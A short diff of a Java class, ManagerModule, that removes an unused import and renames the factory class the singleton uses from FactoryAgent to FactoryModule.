@@ -13,10 +13,9 @@ import java.util.Iterator;
 import com.android.service.Trigger;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.ConfModule;
-import com.android.service.conf.ConfigurationException;
 import com.android.service.interfaces.IncrementalLog;
 import com.android.service.module.BaseModule;
-import com.android.service.module.FactoryAgent;
+import com.android.service.module.FactoryModule;
 import com.android.service.util.Check;
 import com.android.service.util.Utils;
 
@@ -41,7 +40,7 @@ public class ManagerModule extends Manager<BaseModule, String, String> {
 			synchronized (ManagerModule.class) {
 				if (singleton == null) {
 					singleton = new ManagerModule();
-					singleton.setFactory(new FactoryAgent());
+					singleton.setFactory(new FactoryModule());
 				}
 			}
 		}
